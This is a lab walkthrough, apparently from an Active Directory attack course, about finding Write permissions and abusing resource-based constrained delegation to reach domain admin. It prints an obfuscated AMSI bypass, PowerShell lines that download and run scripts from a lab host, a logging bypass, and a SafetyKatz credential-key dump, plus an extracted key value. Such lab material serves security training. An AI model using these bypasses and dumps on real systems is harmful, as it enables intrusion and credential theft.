# ✍️ Find Computer in domain with Write permissions and access as Domain Admin

Let's start by using Powerview to enumerate Write permissions for a user that we have compromised. After trying from multiple users or using BloodHound we would know that the user ciadmin has Write permissions on the computer object of dcorp-mgmt ->&#x20;

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 . .\PowerView.ps1
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Recall that we compromised ciadmin from dcorp-ci. We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.

{% content-ref url="elevate-privileges-and-gain-a-shell.md" %}
[elevate-privileges-and-gain-a-shell.md](elevate-privileges-and-gain-a-shell.md)
{% endcontent-ref %}

Now on the shell ->

```
iex (iwr http://172.16.100.13:8787/sbloggingbypass.txt -UseBasicParsing)
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.13:8787/PowerView.ps1'))
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std613$' -Verbose
Get-DomainRBCD
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Now we need the AES keys of t student VM (as we configured RBCD for it above)

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>50083fa125e328c8b5333ac2dfc62c3e47eb8f6bc0acf08b1ca15eb35894140e</p></figcaption></figure>

